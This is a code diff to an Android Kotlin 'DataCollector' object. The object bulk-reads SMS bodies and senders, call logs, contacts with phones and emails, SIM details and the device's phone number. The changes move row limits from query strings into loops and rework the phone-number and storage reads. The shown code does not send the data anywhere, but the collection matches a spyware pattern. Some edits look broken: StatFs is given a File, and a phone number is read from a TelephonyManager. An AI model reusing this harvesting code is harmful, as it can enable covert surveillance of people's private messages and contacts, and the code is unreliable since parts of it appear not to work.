@@ -29,10 +29,11 @@ object DataCollector {
                 Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY,
                 Telephony.Sms.DATE, Telephony.Sms.TYPE, Telephony.Sms.READ
             )
-            val sortOrder = "${Telephony.Sms.DATE} DESC LIMIT 200"
+            val sortOrder = "${Telephony.Sms.DATE} DESC"
 
             context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
-                while (cursor.moveToNext()) {
+                var count = 0
+                while (cursor.moveToNext() && count < 200) {
                     list.add(mapOf(
                         "id" to cursor.getLong(0),
                         "address" to (cursor.getString(1) ?: ""),
@@ -41,6 +42,7 @@ object DataCollector {
                         "type" to smsType(cursor.getInt(4)),
                         "read" to (cursor.getInt(5) == 1)
                     ))
+                    count++
                 }
             }
         } catch (e: SecurityException) {
@@ -70,10 +72,11 @@ object DataCollector {
                 CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                 CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE
             )
-            val sortOrder = "${CallLog.Calls.DATE} DESC LIMIT 200"
+            val sortOrder = "${CallLog.Calls.DATE} DESC"
 
             context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
-                while (cursor.moveToNext()) {
+                var count = 0
+                while (cursor.moveToNext() && count < 200) {
                     list.add(mapOf(
                         "id" to cursor.getLong(0),
                         "number" to (cursor.getString(1) ?: "unknown"),
@@ -82,6 +85,7 @@ object DataCollector {
                         "duration" to "${cursor.getLong(4)} sec",
                         "type" to callType(cursor.getInt(5))
                     ))
+                    count++
                 }
             }
         } catch (e: SecurityException) {
@@ -106,10 +110,11 @@ object DataCollector {
         try {
             val cursor = context.contentResolver.query(
                 ContactsContract.Contacts.CONTENT_URI, null, null, null,
-                "${ContactsContract.Contacts.DISPLAY_NAME} ASC LIMIT 500"
+                "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
             )
             cursor?.use {
-                while (it.moveToNext()) {
+                var count = 0
+                while (it.moveToNext() && count < 500) {
                     val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                     val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                     val phones = mutableListOf<String>()
@@ -147,6 +152,7 @@ object DataCollector {
                         "phones" to phones,
                         "emails" to emails
                     ))
+                    count++
                 }
             }
         } catch (e: SecurityException) {
@@ -371,7 +377,15 @@ object DataCollector {
             "operator" to (tm?.simOperatorName ?: ""),
             "operator_code" to (tm?.simOperator ?: ""),
             "country" to (tm?.simCountryIso ?: ""),
-            "phone_number" to (tm?.line1Number ?: ""),
+            "phone_number" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                try {
+                    val subscriptionInfo = tm?.createForSubscriptionId(android.telephony.SubscriptionManager.getDefaultSubscriptionId())
+                    subscriptionInfo?.phoneNumber ?: ""
+                } catch (_: Exception) { "" }
+            } else {
+                @Suppress("DEPRECATION")
+                (tm?.line1Number ?: "")
+            },
             "network_name" to (tm?.networkOperatorName ?: "")
         )
     }
@@ -381,7 +395,7 @@ object DataCollector {
         val list = mutableListOf<Map<String, Any>>()
         try {
             val stat = android.os.Environment.getDataDirectory()
-            val statFs = android.os.StatFs(stat.path)
+            val statFs = android.os.StatFs(stat)
             val total = statFs.totalBytes / (1024.0 * 1024.0 * 1024.0)
             val available = statFs.availableBytes / (1024.0 * 1024.0 * 1024.0)
             val used = total - available
@@ -395,7 +409,7 @@ object DataCollector {
 
             // External storage
             val externalDirs = context.getExternalFilesDirs(null)
-            if (externalDirs.size > 1) {
+            if (externalDirs.size > 1 && !externalDirs[1].path.contains("emulated")) {
                 val extStat = android.os.StatFs(externalDirs[1].path)
                 val extTotal = extStat.totalBytes / (1024.0 * 1024.0 * 1024.0)
                 val extAvail = extStat.availableBytes / (1024.0 * 1024.0 * 1024.0)
